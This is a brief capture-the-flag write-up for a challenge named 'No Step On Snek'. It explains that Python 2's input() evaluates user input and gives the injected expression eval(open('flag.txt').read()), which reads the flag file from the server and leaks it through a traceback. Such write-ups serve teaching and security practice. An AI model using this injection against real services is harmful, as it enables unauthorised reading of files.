---
description: Python input() vulnerability
---

# No Step On Snek

## Challenge

I heard you guys like python pwnables

nc umbccd.io 4000

Author: trashcanna

## Solution

A different board is shown every time.

![](../../.gitbook/assets/4fcbf20b712648a4ab9ca3646dccbf09.png)

`move = input("Make your move: ")`

The output shows us that Python 2 is used -- the code tries to evaluate the input.

![](../../.gitbook/assets/89f52260155c43f5b3dbe191ed3d5be6.png)

We can pass in `eval(open('flag.txt').read())` as the input. In the traceback, we get the flag.

![](../../.gitbook/assets/a30e10bbb35b48679c5731acf851ed0a.png)

